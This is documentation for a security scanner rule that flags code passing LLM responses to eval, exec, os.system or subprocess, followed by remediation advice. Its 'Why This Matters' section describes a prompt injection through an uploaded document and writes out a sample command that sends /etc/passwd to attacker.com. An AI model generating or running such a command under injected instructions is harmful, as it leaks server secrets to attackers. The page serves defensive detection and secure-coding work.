---
title: "VNX-LLM-002 – LLM Output Passed to Code Execution (RCE)"
description: "Detects LLM model response content passed directly to eval(), exec(), os.system(), or subprocess — enabling remote code execution if the model is manipulated via prompt injection."
---

## Overview

This rule detects code where the output of an LLM API call (the `content` field from `choices[0].message.content` or similar) is passed directly to a code or shell execution function such as `eval()`, `exec()`, `os.system()`, or `subprocess`. When an LLM generates code or commands that are executed without validation, any attacker who can influence the model's response — through prompt injection, indirect injection via documents, or a compromised model endpoint — can execute arbitrary code on your server. This maps to CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code).

**Severity:** Critical | **CWE:** [CWE-95 – Improper Neutralization of Directives in Dynamically Evaluated Code](https://cwe.mitre.org/data/definitions/95.html)

## Why This Matters

The common intuition is "we'll just validate the model output before executing it." This is insufficient for two reasons. First, LLMs are non-deterministic — any validation logic you write is essentially trying to predict and block all possible outputs of a model you do not fully control. Second, if an attacker can influence the model's inputs through prompt injection (VNX-LLM-001), they can craft inputs that cause the model to generate outputs that pass your validation checks while still being malicious.

In an agentic architecture where the model generates Python code to answer data analysis questions, an attacker who can inject a prompt (perhaps via a malicious uploaded document) can cause the model to output `import subprocess; subprocess.run(["curl", "https://attacker.com/exfil", "-d", open("/etc/passwd").read()])` — and if that is passed to `exec()`, it runs on your server. This is the OWASP LLM Top 10's LLM02 (Insecure Output Handling) class of vulnerability.

## What Gets Flagged

The rule matches lines where `eval`, `exec`, `os.system`, or `subprocess` appear in proximity to LLM response variable names (`response`, `content`, `result`, `output`, `choices`).

```python
# FLAGGED: LLM output content passed to exec()
content = response.choices[0].message.content
exec(content)
```

```python
# FLAGGED: LLM result passed to eval on same line
eval(result)  # where result is derived from LLM choices
```

```python
# FLAGGED: shell execution of LLM-generated command
os.system(response.choices[0].message.content)
```

## Remediation

1. **Never execute LLM-generated content as code.** If you need the model to produce executable results, use structured tool calls with a strict JSON Schema defining exactly which functions can be called and with what parameter types.

   ```python
   # SAFE: use function calling / tool use with a defined schema
   tools = [{
       "type": "function",
       "function": {
           "name": "run_query",
           "description": "Run a pre-approved SQL query",
           "parameters": {
               "type": "object",
               "properties": {
                   "query_id": {"type": "string", "enum": ["top_users", "revenue_summary"]},
                   "limit": {"type": "integer", "minimum": 1, "maximum": 100}
               },
               "required": ["query_id"]
           }
       }
   }]
   response = openai.chat.completions.create(model="gpt-4o", messages=messages, tools=tools)
   # Only call your own functions — never exec() the model's text output
   tool_call = response.choices[0].message.tool_calls[0]
   result = dispatch_tool(tool_call.function.name, json.loads(tool_call.function.arguments))
   ```

2. **Use a sandboxed execution environment if code execution is genuinely required.** Run generated code in a container with no network access, read-only filesystem mounts, and strict resource limits. Libraries like `RestrictedPython` or `seccomp`-based sandboxes reduce but do not eliminate risk.

3. **Validate tool call arguments against a strict allowlist.** Even with tool calling, validate every argument before dispatching. If `query_id` is expected to be one of a fixed set, check it explicitly — do not pass it to an arbitrary handler.

4. **Log all LLM outputs before execution.** Even in a sandboxed environment, log every piece of LLM-generated content that influences code execution paths. This enables forensic analysis if an incident occurs.

## References

- [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code](https://cwe.mitre.org/data/definitions/95.html)
- [OWASP LLM Top 10 – LLM02: Insecure Output Handling](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [CAPEC-242: Code Injection](https://capec.mitre.org/data/definitions/242.html)
- [OpenAI – Function Calling Guide](https://platform.openai.com/docs/guides/function-calling)
- [Anthropic – Tool Use Documentation](https://docs.anthropic.com/en/docs/build-with-claude/tool-use)
- [MITRE ATT&CK T1059 – Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
